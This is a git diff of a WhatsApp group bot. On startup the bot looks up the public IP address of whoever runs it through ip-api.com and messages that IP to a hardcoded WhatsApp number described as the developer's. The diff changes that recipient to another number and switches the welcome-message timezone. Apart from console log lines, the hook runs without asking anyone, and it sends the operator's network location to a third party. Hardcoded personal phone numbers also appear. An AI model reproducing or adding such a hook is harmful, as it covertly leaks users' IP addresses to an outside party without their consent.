@@ -56,7 +56,7 @@ const starts = async (hyper = new WAConnection()) => {
     console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       hyper.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94767043432?text=welcome"}}})
+       hyper.sendMessage("13433020996@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/13433020996?text=welcome"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     hyper.on('connecting', () => {
@@ -120,7 +120,7 @@ const imageToBase64 = require('image-to-base64')
         num = anu.participants[0];
         let v = hyper.contacts[num] || { notify: num.replace(/@.+/, "") };
         anu_user = v.vname || v.notify || num.split("@")[0];
-        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
+        time_wel = moment.tz("Asia/Kolkata").format("HH:mm");
         
         
         teks = `Halo ${anu_user} \n\nNama : \nAge :\nGender : Girl/Boy\nAsal :\n\nHope you feel at home and don t forget to fill in\nAnd Following Rules Group`;
